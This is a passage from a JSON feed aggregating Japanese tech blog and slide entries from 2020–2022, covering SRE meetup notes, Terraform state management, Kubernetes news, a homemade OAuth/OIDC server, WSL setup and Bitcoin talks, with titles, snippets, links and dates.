コードを書くのは最終手段。書いた瞬間に負債になる時刻でEC2終了するLambdaオートスケーリングでいいのでは?terrafromでLambda扱いにくい問題SREとしてセキュリティに対しての役割サービスInspectorECRのイメージスキャンCI/CD成立してからじゃないとイメージスキャンできないGuardDutySSOIAM Userを撲滅できたただ個別要件に対応しにくいSREが見てるケースが多いコーポレートセキュリティは範疇じゃないが、アプリケーションセキュリティは範疇5,6人目にセキュリティが強い人がほしい着想の段階からセキュリティの観点をいれておきたいモニタリングロギングの観点で使用してるAWSのサービスAMPEKS使ってるのでコスパが良かったCloudWatch log通知考えるとLambda使わないとAthenaわずらわしい検索しにくいLokiとかに寄せたいログをどこにおくS3Lokiってこれかな?Grafana Loki | Grafana Labs雑感他の会社のSREの話を今まであまり聞くことがなかったので、気づきを得る部分が多かった。SREのミッション・ビジョン・バリューはちょっと考えてみたいなと思った。オンライン開催の形式はYouTube Liveがいいなあって思った。聞き逃しても巻き戻して聞き返せるのがすごい体験として良い。","link":"https://blog.masasuzu.net/entry/2022/02/26/012602","isoDate":"2022-02-25T16:26:02.000Z","dateMiliSeconds":1645806362000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"[2022/02/25] 今週のKubernetes + Cloud Native + その他ニュース","contentSnippet":"普段は#kubenewsの2022年02月25日の回で話す、@bells17が今週気になったニュース記事をまとめたものです。自分が気になった今週のKubernetes + Cloud Native + その他なニュースをまるっとまとめておいて、その中から時間内に話せるものを話そうと思ってます。あと記事はざっと読んで書いてるものが多いので、詳細はリンクとかで貼ってる記事の中を読んでもらった方が正確です。配信URL: 配信中止して記事だけ放流したので配信URLはありません 告知とかニュースっぽいもの NetApp Insight Japan 2022で講演しましたセッション動...","link":"https://zenn.dev/bells17/articles/k8s-cloud-native-and-other-20220225","isoDate":"2022-02-25T13:31:31.000Z","dateMiliSeconds":1645795891000,"authorName":"bells17","authorId":"bells17"},{"title":"Mastering the Lightning Network 第1章を読む補足資料","contentSnippet":"https://cryptocurrency.connpass.com/event/239005/\\rMastering the Lightning Network 第1章の補足資料です","link":"https://speakerdeck.com/shukob/mastering-the-lightning-network-di-1zhang-wodu-mubu-zu-zi-liao","isoDate":"2022-02-25T05:00:00.000Z","dateMiliSeconds":1645765200000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"JJUGに向けて再変更/公演 CloudNativeな時代に求められるWebサービス基盤モデルの再考","contentSnippet":"JJUGナイトセミナー「Dapr特集」2/24(木) 開催\\r\\rhttps://www.java-users.jp/post/night202202/","link":"https://speakerdeck.com/nwiizo/gong-yan-cloudnativenashi-dai-niqiu-merareru-websabisuji-pan-moderufalsezai-kao","isoDate":"2022-02-24T05:00:00.000Z","dateMiliSeconds":1645678800000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"Future Tech Night #20 Terraform State縛りの勉強会 #future_tech_night","contentSnippet":"future.connpass.com久しぶりにちゃんと勉強会の感想ブログ書きます。① State の分割戦略 〜ModulesとWorkspacesを利用して〜StateはTerraform上での管理を分ける意味では非常に重要な要素であり、適切に分けることで不慮の事故や予期せぬ変更からクラウドリソースを守ることができます。このセッションでは演者が実際にTerraformを利用して感じたことを交えながら、適切なStateの分割戦略とは？について話します。Stateの分割についてModuleによるアプローチとWorkspacesによるアプローチ、そしてそのあわせ技についての説明がありました。Workspacesは使ったことないのであまり知見がなかったので、いろいろ参考になる部分がありました。今のterraform運用だと環境ごとにディレクトリを切ってstateを分割してます。で、環境ごとの差異としてパラメータだけでなく、作るリソース作らないリソースが若干まちまちなので、そのままだとWorkspacesは向かないなと感じました。絶対に作るリソース、RDSやVPCなどは分割した上でWorkspacesで管理するのはありなのかなとは思いました。ただ、同じシステムで、環境毎のディレクトリとリソース毎のディレクトリが混在するのはわかりにくくならないかなという懸念はあります。悩ましいですねあと、ブランチ戦略も難しいですね。現状はmasterでprdをapplyするように、stagingでそれ以外の環境をapplyするようになってますが、全部masterでやるようにしても良いのではと思ったりもしてる今日このごろです。② クラウドリソース自体をdestroy/createdせずに、Terraformリソース定義の記述場所を変更する方法クラウドサービス上で稼働するリソースには一切手を付けずに、Terraformの定義記載場所だけを変更する方法を話します。Terraformを利用していると「このディレクトリ配置じゃダメだ。配置変えしたいのだけれど、リソースの再作成はできない。次にインフラ設計するときは、〇〇に注意しよう」という運用ナレッジが貯まると思います。スタート時点で完璧なTerraformディレクトリ設計ができれば御の字ですが、それが不可能なことは、この分野でベストプラクティスが確立されていないことにより証明されています。本パートでは「Terraformのディレクトリ配置には定石がないのだから、運用状況に合わせて柔軟に配置換えすべき」という観点から、「動作中リソースに影響なく、Terraform定義箇所を移植する方法」について話します。20220217_FutureTechNight_#20_TerraformState縛りの勉強会.pptx - Google スライドこんなふうに別のtfstateファイルにリソースをmvすることによって、Stateにリソースを移動できる手法を説明してました。terraform state mv -state-out=${moved_resource.tfstate} ${moved_resource}terraform state pull > ${to.tfstate}terraofm state mv -state=${moved_resource.tfstate} -state-out=${to.tfstate}terraform state push ${to.tfstate}State間でのリソース移動に関しては、terraform state rmとterraform importのあわせ技しか知らなかったので、新しい知見を得ました。まだ試せてないないんですが、State内での移動であれば、moved block使うのもありなのかなと思いました。ちなみリソースが消えた場合にもmove blockって使えるんですかね?なかなか他の会社のterraform運用の話を聞く機会があまりなかったので、楽しかったですね。最近勉強会出てもメモすら残さないことが多くて、せっかく参加したのにあまり有意義に時間を使えていなかったので、薄くてもいいので今後ちゃんと感想、意見を書き残していきたいと思いました。","link":"https://blog.masasuzu.net/entry/2022/02/17/210848","isoDate":"2022-02-17T12:08:48.000Z","dateMiliSeconds":1645099728000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"CloudNativeな時代に求められるWebサービス基盤モデルの再考","contentSnippet":"Developers Summit 2022\\rhttps://event.shoeisha.jp/devsumi/20220217\\r\\rhttps://event.shoeisha.jp/devsumi/20220217/session/3648/\\r\\r今週、ずっと体調が悪く昨日、PCR検査受けたが陰性\\r後ほど、修正して再度、上げます。","link":"https://speakerdeck.com/nwiizo/cloudnativenashi-dai-niqiu-merareru-websabisuji-pan-moderufalsezai-kao","isoDate":"2022-02-17T05:00:00.000Z","dateMiliSeconds":1645074000000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"Kubelet APIをcurlで叩く","link":"https://bells17.medium.com/curl-to-kubelet-api-f73cb17888b7?source=rss-713cf42ce34d------2","isoDate":"2022-02-10T16:10:23.000Z","dateMiliSeconds":1644509423000,"authorName":"bells17","authorId":"bells17"},{"title":"[2022/02/10] 今週のKubernetes + Cloud Native + その他ニュース","contentSnippet":"普段は#kubenewsの2022年02月10日の回で話す、@bells17が今週気になったニュース記事をまとめたものです。自分が気になった今週のKubernetes + Cloud Native + その他なニュースをまるっとまとめておいて、その中から時間内に話せるものを話そうと思ってます。あと記事はざっと読んで書いてるものが多いので、詳細はリンクとかで貼ってる記事の中を読んでもらった方が正確です。配信URL:https://youtu.be/adlS59o984M 告知とかニュースっぽいもの k8sを便利にするらしいTanzu Application Platform...","link":"https://zenn.dev/bells17/articles/k8s-cloud-native-and-other-20220210","isoDate":"2022-02-10T12:56:14.000Z","dateMiliSeconds":1644497774000,"authorName":"bells17","authorId":"bells17"},{"title":"[2022/02/04] 今週のKubernetes + Cloud Native + その他ニュース","contentSnippet":"普段は#kubenewsの2022年02月04日の回で話す、@bells17が今週気になったニュース記事をまとめたものです。自分が気になった今週のKubernetes + Cloud Native + その他なニュースをまるっとまとめておいて、その中から時間内に話せるものを話そうと思ってます。あと記事はざっと読んで書いてるものが多いので、詳細はリンクとかで貼ってる記事の中を読んでもらった方が正確です。配信URL:https://youtu.be/adlS59o984M 告知とかニュースっぽいもの Yahoo! Japan TechCanference 2022https...","link":"https://zenn.dev/bells17/articles/k8s-cloud-native-and-other-20220204","isoDate":"2022-02-04T10:56:59.000Z","dateMiliSeconds":1643972219000,"authorName":"bells17","authorId":"bells17"},{"title":"自作したOAuthサーバを拡張してOIDC機能を追加してみる","contentSnippet":"はじめに前回、OAuthサーバを自作してみました。せっかくなのでOIDCの機能を追加してOIDCサーバとしても振る舞えるようにしたいと思います。コードは以下になります。https://github.com/sat0ken/goauth-server 準備jwtを作るときの署名用にopensslコマンドでキーペアを作成しておきます。pemファイルはmain.goと同じフォルダに置いておきます。$ openssl genrsa > private-key.pem$ openssl rsa -in private-key.pem -pubout -out publ...","link":"https://zenn.dev/satoken/articles/golang-oidc-server","isoDate":"2022-01-10T07:56:35.000Z","dateMiliSeconds":1641801395000,"authorName":"satoken","authorId":"satoken"},{"title":"雰囲気でOAuthを使っていたエンジニアがOAuthサーバ(RFC6749)を自作してみる","contentSnippet":"はじめにAuth屋さんの本やその他有識者のBlogなどを読むことで少しながらOAuthやOIDCの仕組みが理解できてきました。そんななかで以下の記事が大変勉強になりました。https://qiita.com/TakahikoKawasaki/items/e508a14ed960347cff11↑の記事ではRubyで実装されているのですが、これを参考というかほぼ丸コピですがgolangで実装してみたいと思います。コードは以下にあります。https://github.com/sat0ken/goauth-server 仕様OAuthサーバでは認可エンドポイントとトークン...","link":"https://zenn.dev/satoken/articles/golang-oauth-server","isoDate":"2022-01-03T09:24:05.000Z","dateMiliSeconds":1641201845000,"authorName":"satoken","authorId":"satoken"},{"title":"WSL2でDNSは8.8.8.8を見つつX Serverを利用する","contentSnippet":"概要VPNを利用するのでDNSサーバーを8.8.8.8に固定したいしかし、X Serverを使うので環境変数DISPLAYにWindowsが解決するホスト名を使用しているexport DISPLAY=\\"$(hostname).mshome.net:0.0\\"DISPLAYにホスト名ではなくIPアドレスを設定しDNSサーバーを固定する DNSサーバーを固定 /etc/wsl.confを作成/etc/wsl.conf[network]generateResolvConf = false /etc/resolv.confを削除$ sudo unli...","link":"https://zenn.dev/tayusa/articles/8a76c02772d0a5","isoDate":"2021-12-28T00:57:59.000Z","dateMiliSeconds":1640653079000,"authorName":"Atsuya Tsukada","authorId":"atsuya0"},{"title":"Accurateの内部実装","link":"https://bells17.medium.com/accurate-internal-70915fe716ca?source=rss-713cf42ce34d------2","isoDate":"2021-12-15T18:56:05.000Z","dateMiliSeconds":1639594565000,"authorName":"bells17","authorId":"bells17"},{"title":"Nuxt.jsを「正しく」終了する","contentSnippet":"はじめにこの記事はNuxt.js Advent Calendar2021の12日目の記事です。11日目は@Skmt3PさんのNuxtのコンポーネントをWeb Componentとして利用するでした。(web component触ってきてないからへぇって気持ちで読まさせていただきました) 概要hooks自体を調べていたときにcloseという項目がありました。そして、説明にはNuxt インスタンスが正しく終了したときというのがありました。「正しく」とは一体…となって原文を見てみるとNuxt instance is gracefully closing.というこ...","link":"https://zenn.dev/satohjohn/articles/fd876409209ed1","isoDate":"2021-12-11T15:35:11.000Z","dateMiliSeconds":1639236911000,"authorName":"SatohJohn","authorId":"SatohJohn"},{"title":"Daprつかってみた(Web APIのイメージでローカルストレージとGCSを同じように扱ってみる)","contentSnippet":"この記事は Web API Advent Calendar 2021 の5日目の記事になりますちなみに4日目は@sys_zeroさんのPower Automate for desktopの変数に関するTips「JSONにnull値がある場合の選択的置換」でした今回は、当日まで全く内容について考えられてなかったのですが、ふっと、頭にわいた、個人的に気になっているDaprについて調べて、ローカルストレージとGoogle Cloud Storage(以下GCS)を扱ってみます なんで今回Dapr？Daprを使うメリットの1つとして、他のサービスにつなぐ方法をHTTPまたはgRPCに...","link":"https://zenn.dev/satohjohn/articles/96873574f07534","isoDate":"2021-12-04T15:01:17.000Z","dateMiliSeconds":1638630077000,"authorName":"SatohJohn","authorId":"SatohJohn"},{"title":"インフラエンジニアが学んだGo言語での並行処理失敗パターン","contentSnippet":"2021/11/16 Infra Study 2nd #7「SREと組織」にて発表\\rhttps://forkwell.connpass.com/event/228038/","link":"https://speakerdeck.com/nwiizo/inhuraenziniagaxue-nda-goyan-yu-defalsebing-xing-chu-li-shi-bai-patan","isoDate":"2021-11-16T05:00:00.000Z","dateMiliSeconds":1637038800000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"GKE CNI Deep Dive (2021)","contentSnippet":"GKE (Google Kubernetes Engine) のネットワーク周りの実装はユーザーの見えないところで変化を続けています。以前は、公式ドキュメントにあるように bridge interf…","link":"https://qiita.com/toVersus/items/4ff2525d562d8de4d530","isoDate":"2021-10-23T08:20:56.000Z","dateMiliSeconds":1634977256000,"authorName":"Tsubasa Nagasawa","authorId":"toVersus"},{"title":"WSLでGitHubのPersonal access token認証","contentSnippet":"参考https://github.com/microsoft/Git-Credential-Manager-Core#windows-subsystem-for-linux-wsl GitCredentialManagerとGitをインストールPowerShellにて> winget install --id Microtsoft.GitCredentialManagerCore> winget install --id Git.Gitwingetがなければ https://github.com/microsoft/winget-cli#installing...","link":"https://zenn.dev/tayusa/articles/f81e6551642867","isoDate":"2021-09-30T16:01:55.000Z","dateMiliSeconds":1633017715000,"authorName":"Atsuya Tsukada","authorId":"atsuya0"},{"title":"Vuexの型定義でモジュールでの型解決してくれるようにしてみた","contentSnippet":"前提Nuxt.jsでVuexを使っているのでそのときにhttps://github.com/ktsn/vuex-type-helper以下を利用させてもらっていましたただ、モジュールのstore場合利用時にtypeがうまくはまらないから、どうするんだろうとか色々見てたのですがあんまりいい手段が見つからなく、自分で型定義でテンプレートリテラル部分書いたらどうなんだろうとおもってやってみました。正直もっと良い手段があると思いますが、今回は自分の勉強踏まえの備忘録。そして、多分Vue3対応とかが入ったらちゃんと動いていくんだと思うので、後で書き換えればいいし、現状型の問題だけな...","link":"https://zenn.dev/satohjohn/articles/b064cf966a9e20","isoDate":"2021-09-11T04:37:38.000Z","dateMiliSeconds":1631335058000,"authorName":"SatohJohn","authorId":"SatohJohn"},{"title":"FirebaseのCliでの操作で401系エラーが出るときの解決法","contentSnippet":"考えられる原因は以下ですログインできていない本当に権限がないcliに保存されているクレデンシャルが古い 前提環境としてはfirebase-tools 9.16.5です ログインできていないコレはわかりやすいです。以下コマンドでログインしてくださいfirebase loginちなみに、すでにログインしている場合は、ログインしているアカウントが表示されます(コレはまりポイント 本当に権限がないGCPのIAMの権限を確認してください。個人で直接Firebaseプロジェクトを作っている場合はあまり関係がないかもしれません。 cliに保存されているクレデンシャ...","link":"https://zenn.dev/satohjohn/articles/d409819196c6b8","isoDate":"2021-08-17T05:54:30.000Z","dateMiliSeconds":1629179670000,"authorName":"SatohJohn","authorId":"SatohJohn"},{"title":"ストレングスファインダーのコーチングを受けてみた","link":"https://bells17.medium.com/strengthsfinder-2140afddf46f?source=rss-713cf42ce34d------2","isoDate":"2021-08-11T13:27:04.000Z","dateMiliSeconds":1628688424000,"authorName":"bells17","authorId":"bells17"},{"title":"SREの車窓から","contentSnippet":"GeekGig #1 〜Goと私の一年〜\\rhttps://showcase-gig.connpass.com/event/217914/","link":"https://speakerdeck.com/nwiizo/srefalseche-chuang-kara","isoDate":"2021-08-11T04:00:00.000Z","dateMiliSeconds":1628654400000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"オープンソースが法定通貨になる！ビットコイン・ライトニングネットワーク入門","contentSnippet":"オープンソースカンファレンス2021 Kyotoでの発表です。\\rhttps://event.ospn.jp/osc2021-online-kyoto/session/376855\\r2021年6月、中南米の国エルサルバドルで仮想通貨ビットコインが法定通貨として定められました。ビットコインはオープンソースで稼働しています。ビットコインの少額決済のための応用技術ライトニングネットワークもエルサルバドルでは既に実用化しており、ライトニングネットワークを中心にビットコイン技術を説明させていただきました。","link":"https://speakerdeck.com/shukob/opunsosugafa-ding-tong-huo-ninaru-bitutokoinraitoningunetutowakuru-men","isoDate":"2021-07-31T04:00:00.000Z","dateMiliSeconds":1627704000000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"Kube API Serverの内部実装を解説する技術同人誌を技術書典11で出しました!","link":"https://bells17.medium.com/wrote-the-kube-api-server-book-2155129db374?source=rss-713cf42ce34d------2","isoDate":"2021-07-19T09:16:43.000Z","dateMiliSeconds":1626686203000,"authorName":"bells17","authorId":"bells17"},{"title":"よみがえるMakefile","contentSnippet":"July Tech Festa 2021\\rhttps://techfesta.connpass.com/event/213069/\\r\\r40分の資料を直前に20分に直した。。。\\r# July Tech Festaとは\\r2013年から始まったJuly Tech Festaは、ITエンジニアに情報交換と人脈構築の場を提供するとともに、ITに係るエンジニアの知的興味を満足させるための祭典です。セッション内容はIoT、AI、機械学習、クラウド最新事情、コンテナ技術、DevOpsなど多岐に渡ります。\\r\\r「 ITに関わる全ての人の知的好奇心を満たすお祭りを作りたい」ーー\\rその思いから July Tech Festa は生まれました。\\r\\r興味のある技術に触れ、普段会えない人の話を聞き、\\r参加したエンジニアがスキルやキャリアについて考えるきっかけになる\\r\\rそんな場を作ろうと、July Tech Festa 2021 を開催します。\\r\\r# テーマ「今さら聞けないIT技術」\\r「みんなの”今さら聞けない”を集め、それを詳しい人に話してほしい！」 そんな思いから「#今さら聞けないIT技術」と題して、みんなが「今さら聞けないけど聞きたい」と思っていることや、「若手エンジニアに知っておいてほしい！」ということをお話しいただきます。","link":"https://speakerdeck.com/nwiizo/yomigaerumakefile","isoDate":"2021-07-18T04:00:00.000Z","dateMiliSeconds":1626580800000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"Oracleインストール中にでたSysctl系エラーであたったkernel parameterについて","contentSnippet":"Oracleインストール中にでたSysctl系エラーであたったkernel parameterについてTable of ContentsOracleインストール中にでたSysctl系エラーであたったkernel parameterについてMotivationそもそもsysctlとは何なのか？Oracleセットアップ中に遭遇したkernel parameterssemopm変更方法セマフォ(semaphore)とは？SEMSMLSEMMNSSEMOPMSEMMNIfile-max変更方法rem_default/rem_max/...","link":"https://zenn.dev/nnaka2992/articles/1fa7fb5d03f958","isoDate":"2021-07-11T08:41:03.000Z","dateMiliSeconds":1625992863000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"Open Telemetry + Google Cloud Trace やってみた","contentSnippet":"モチベーションGoogle Cloud Trace(以下Cloud Trace)がOpen Telemetryの対応をしているということで、更にドキュメントにはないけど(2021-06-14現在)Javaでもライブラリができたので、それを試してみる。分散トレーシングしたいって言う場合、GKEで組んでいる場合、Cloud Traceのライブラリを使って直接送るっていうのもありだが、Open Telemetryを使うことで、他のツールにも送れるような仕組みができる。 前提分散トレーシングについて知っているNuxt.jsについて少し知っている Open Telemetr...","link":"https://zenn.dev/satohjohn/articles/e37e8575966204","isoDate":"2021-06-14T05:35:09.000Z","dateMiliSeconds":1623648909000,"authorName":"SatohJohn","authorId":"SatohJohn"},{"title":"denops.vimを使って引用符と括弧を操作するVimのプラグインを書いた","contentSnippet":"はじめにかねてから、Denoを触ってみたいけど肝心の作るものがないなと思っていました。そんな矢先にたまたまdenops.vimとの邂逅を果たしたので、昔作ったプラグインを書き直してみました。denops.vimについてはhttps://github.com/vim-denops/denops.vimhttps://zenn.dev/lambdalisue/articles/b4a31fba0b1ce95104c9 作ったものhttps://github.com/atsuya0/dps-surrounding.vim題目のとおり、引用符と括弧を操作するvimのプラグイ...","link":"https://zenn.dev/tayusa/articles/58d1c20172f662","isoDate":"2021-06-13T15:41:53.000Z","dateMiliSeconds":1623598913000,"authorName":"Atsuya Tsukada","authorId":"atsuya0"},{"title":"Kustomize でスラッシュを含むパスにパッチを当てる","contentSnippet":"背景Kustomize では JSON Patch を用いて base のマニフェストにパッチを当てることができます。例えば，以下のマニフェストdeployment.yamlapiVersion: apps/v1kind: Deploymentmetadata:  labels:    app.kubernetes.io/name: myapp    app.kubernetes.io/version: v1.0.0    name: myapp    version: v1.0.0...の version の値を v1.0.1 に変えたい場合は，以下の...","link":"https://zenn.dev/toshikish/articles/38896bb9ae1913","isoDate":"2021-05-31T07:34:24.000Z","dateMiliSeconds":1622446464000,"authorName":"toshikish","authorId":"toshikish"},{"title":"ビットコイン・ブロックチェーン入門","contentSnippet":"https://3rdlink.connpass.com/event/212383/\\rサードプレイス金沢\\r話題のNFT！だけどブロックチェーンってどゆこと？ ＜オンラインイベント＞\\rで使用した資料です。","link":"https://speakerdeck.com/shukob/bitutokoinburotukutienru-men-2d08bdc8-8f6d-4116-b7e7-f15c9722d59d","isoDate":"2021-05-12T04:00:00.000Z","dateMiliSeconds":1620792000000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"Rustの練習","contentSnippet":"概要完全に参照の部分に慣れていないので、これをどうやって対応したのかを自分の整理のためにもメモしていくexerismでRustの勉強をしているが、その問題を使う Simple Linked List全容： https://exercism.io/tracks/rust/exercises/simple-linked-list/solutions/d0fdfb1c904344ecbf4bcf808c345cdc以下のような構造ときので後入れ先出しのパターンの場合pub struct SimpleLinkedList<T> {    head: Option&...","link":"https://zenn.dev/satohjohn/articles/536589f3a86600","isoDate":"2021-05-01T14:15:59.000Z","dateMiliSeconds":1619878559000,"authorName":"SatohJohn","authorId":"SatohJohn"},{"title":"First-Party Setsについて","contentSnippet":"概要Cookie のセキュリティについてです。 partyCookieにはfirst-partyとthird-partyがあります。first-partyとは現在訪れているドメインです。third-partyとは現在訪れているドメインとは違うドメインです。 SameSite Cookieshttps://developer.mozilla.org/ja/docs/Web/HTTP/Headers/Set-Cookie/SameSite現在、訪れているドメインから別ドメインにHTTPリクエストを送信するときに、Cookieをセットするか設定するものです。これには...","link":"https://zenn.dev/tayusa/articles/efa8aa75ad5519","isoDate":"2021-04-25T16:30:34.000Z","dateMiliSeconds":1619368234000,"authorName":"Atsuya Tsukada","authorId":"atsuya0"},{"title":"Bitcoin v0.21.0とSignetの使い方","contentSnippet":"2021年1月にリリースされたBitcoin v0.21.0と、その中で正式リリースとなったPoA型テストネットであるSignetの使い方をご紹介します。\\r\\rhttps://cryptocurrency.connpass.com/event/210362/","link":"https://speakerdeck.com/shukob/bitcoin-v0-dot-21-dot-0tosignetfalseshi-ifang","isoDate":"2021-04-22T04:00:00.000Z","dateMiliSeconds":1619064000000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"Ansibleのyumリポジトリを作成しスタンドアロンのサーバで使用する手順","contentSnippet":"#目的と背景スタンドアロン(社内リポジトリ及びインターネット繋がってない)にパッケージ入れたいけど、依存パッケージが多すぎて無理ゲーなのでリポジトリごと転送したい場合の方法です。今回はyumコマン…","link":"https://qiita.com/nullzebra/items/221b531ac450d2da0149","isoDate":"2021-02-28T17:51:58.000Z","dateMiliSeconds":1614534718000,"authorName":"Satoru Kikuta","authorId":"nullzebra"},{"title":"July Tech Festa 2021 winterで発表&運営スタッフをしました","link":"https://bells17.medium.com/july-tech-festa-2021-winter%E3%81%A7%E7%99%BA%E8%A1%A8-%E9%81%8B%E5%96%B6%E3%82%B9%E3%82%BF%E3%83%83%E3%83%95%E3%82%92%E3%81%97%E3%81%BE%E3%81%97%E3%81%9F-385e7e18aac4?source=rss-713cf42ce34d------2","isoDate":"2021-01-26T04:26:28.000Z","dateMiliSeconds":1611635188000,"authorName":"bells17","authorId":"bells17"},{"title":"AWS ソリューションアーキテクト アソシエート合格までのまとめ","contentSnippet":"#目次#0. はじめに先日、AWS ソリューションアーキテクト アソシエート に合格したので、忘れないうちに色々とアウトプットしておこうと思います。これから受験を考えている方の役にたてればと思い…","link":"https://qiita.com/dirtymosschan/items/da3eebdf6b7be9c3eb67","isoDate":"2021-01-19T13:11:47.000Z","dateMiliSeconds":1611061907000,"authorName":"Yu Kaneko","authorId":"mos914"},{"title":"2020年にKubernetse関連で取り組んだことまとめ","link":"https://bells17.medium.com/2020-kubernetse-4771e660a174?source=rss-713cf42ce34d------2","isoDate":"2020-12-23T16:04:00.000Z","dateMiliSeconds":1608739440000,"authorName":"bells17","authorId":"bells17"},{"title":"GCP の Identity Aware-Proxy を使って SSH した話","contentSnippet":"#Cloud Identity Aware-Proxy とは？一言で表すと、Google のアカウントを使ってセキュアにリソースに接続できるプロキシサービスです。###何ができる？GCP 上の…","link":"https://qiita.com/dirtymosschan/items/fd11001daa68d7c8d943","isoDate":"2020-12-22T11:20:18.000Z","dateMiliSeconds":1608636018000,"authorName":"Yu Kaneko","authorId":"mos914"},{"title":"SSHを使用せずにTeratermからWSLを使う","contentSnippet":"ALHアドベントカレンダー202012/19(土)もきくりんが担当します！今回は小ネタになります。WSLをTetatermで使う、とても便利なのですが標準のコンソールの使い勝手があまり良くなく(UI全般、ログが取れない、コピペしにくい等…","link":"https://qiita.com/nullzebra/items/6bfe92646ddbaa548977","isoDate":"2020-12-20T09:55:35.000Z","dateMiliSeconds":1608458135000,"authorName":"Satoru Kikuta","authorId":"nullzebra"},{"title":"gRPC-WebとGoとVue.jsで簡素なチャット","contentSnippet":"はじめに何だか良くわからないけどよく聞くgRPC-Webなるものを触りだけでも理解すべく辛うじてチャット呼べそうなものを作ってみました。概要gRPCとはhttps://grpc.io/Pr…","link":"https://qiita.com/atsuya0/items/f994ca9d820d307daffd","isoDate":"2020-12-17T17:06:43.000Z","dateMiliSeconds":1608224803000,"authorName":"Atsuya Tsukada","authorId":"atsuya0"},{"title":"VolumePlugin がボリュームを作成・マウントするしくみ","contentSnippet":"はじめにPod の作成時、pod.spec.volumes に記述したボリュームがコンテナにマウントされます。マウントされる Node 側のボリュームを、VolumePlugin がどのように作…","link":"https://qiita.com/kyohmizu/items/40bee7037e1ce7949772","isoDate":"2020-12-17T10:54:47.000Z","dateMiliSeconds":1608202487000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"Sidekiqのジョブをパフォーマンスを考えて削除する","contentSnippet":"はじめにRailsで処理を何らかの理由で遅延させた場合や非同期に処理を行いたいときに多くの人がActive Jobを使用していると思います。とても便利で良いやつなのですがキューに積んだジョブを削…","link":"https://qiita.com/atsuya0/items/30d6259766a9a0d5103d","isoDate":"2020-12-12T17:37:05.000Z","dateMiliSeconds":1607794625000,"authorName":"Atsuya Tsukada","authorId":"atsuya0"},{"title":"任意のファイルをPNGファイルで隠してみる","contentSnippet":"はじめにある日、私はファイルを連結したらどうなるんだろうという好奇心に逆らえず、おもむろに連結して確かめてみることにしました。結果、その連結したファイルは普通にファイルとして使えることがわかりま…","link":"https://qiita.com/atsuya0/items/a8ccbc9637c37cdf967e","isoDate":"2020-12-12T14:56:30.000Z","dateMiliSeconds":1607784990000,"authorName":"Atsuya Tsukada","authorId":"atsuya0"},{"title":"Raspberry Pi4 3台でKubernetesクラスタ構築","contentSnippet":"ALHアドベントカレンダー202012/12(土)はきくりんが担当いたします！！サーバー、スイッチ、電源、筐体の選定から、組み込み、構築、ナレッジ化とインフラエンジニア総合格闘技的な内容となりま…","link":"https://qiita.com/nullzebra/items/a9b2b262b490f0eabeae","isoDate":"2020-12-12T11:01:44.000Z","dateMiliSeconds":1607770904000,"authorName":"Satoru Kikuta","authorId":"nullzebra"},{"title":".gcloudignoreの書き方","contentSnippet":".gcloudignore の設定が思ったとおりに、いかなかったのでまとめます。.gitignoreと同じらしいですが、そもそもgitで今まで全体をignoreすることはやったことなかったので基本はコチラに書いてあるのですが、わからなかった部分も含みますhttps://cloud.google.com/sdk/gcloud/reference/topic/gcloudignore# 始まりはコメントです 基本の考え ファイル指定以下パターンすべてプロジェクト直下のものが対象になります。否定する場合は ! をつけます。!a.txt というファイルをデプロイ対象にしたい...","link":"https://zenn.dev/satohjohn/articles/11df180df878ac","isoDate":"2020-11-30T09:57:54.000Z","dateMiliSeconds":1606730274000,"authorName":"SatohJohn","authorId":"SatohJohn"},{"title":"Bitcoin Cashハードフォークの 振り返りと関連技術説明","contentSnippet":"2017/8/1のBitcoinとBitcoin Cashの分裂、2018/11/15のBitcoin ABCとSVの分裂、半年に一回のアップグレードなど過去の振り返りとリプレイアタックとリプレイプロテクションなどハードフォークにまつわる技術の説明をしました。\\rhttps://cryptocurrency.connpass.com/event/193239/","link":"https://speakerdeck.com/shukob/bitcoin-cashhadohuokufalse-zhen-rifan-ritoguan-lian-ji-shu-shuo-ming","isoDate":"2020-11-27T05:00:00.000Z","dateMiliSeconds":1606453200000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"GAE + Java 11 + Quarkusってどんなもんよ","contentSnippet":"基本的に今までTypeScript + Node.jsで書いてましたが、そろそろJVMを書きたいという気持ちが出てきました。ただし、Standard環境のGAEは良いものだと知ってしまった、、、ということでJava 11でかけないかなと思いました。GAE + Java 11を利用する上で考えるのは、 初回リクエストのレスポンス速度 (JVMの起動速度+アプリケーションの起動速度) が問題になるかと思います。では、高速に起動する(?)と言われるQuarkusを使って見たらどうだろうと思い、ちょっと調査してみました。Javaと言いながらKotlinで作ってますが、あんまり変わらない(...","link":"https://zenn.dev/satohjohn/articles/70a2b77308e0b982fb70","isoDate":"2020-11-07T13:08:25.000Z","dateMiliSeconds":1604754505000,"authorName":"SatohJohn","authorId":"SatohJohn"},{"title":"ブロックチェーン初心者のためのビットコイン送金体験","contentSnippet":"今注目を集める暗号通貨ビットコインとその基盤技術ブロックチェーン。\\rビットコインもオープンソースでできています。\\r難しいと言われるビットコインやブロックチェーンですが、\\r送金を行うなど実際に使ってみるのはキャッシュレス決済と同じで簡単です。\\rビットコインのテストネットワークで実際に送金を体験していただくことで\\r仕組みの理解を深めていただけます。\\rなお、テストネットのビットコインは無料で入手できますのでお気軽にご参加ください。\\r\\r2020年11月7日(土)関西オープンフォーラム(KOF)にて発表\\rhttps://k-of.jp/backend/session/1379","link":"https://speakerdeck.com/shukob/burotukutienchu-xin-zhe-falsetamefalsebitutokoinsong-jin-ti-yan","isoDate":"2020-11-07T05:00:00.000Z","dateMiliSeconds":1604725200000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"フロントエンド(SPA)でのFirebase Authとの付き合い方","contentSnippet":"Firebase Authで取得したID Tokenをどう使うか、どう保管するかが結構難しいと思っています。その中で、WebアプリケーションにおいてFirebaseのドキュメントには2パターンがあるように見えました。Cookieを使ったSession管理ID Token+Service 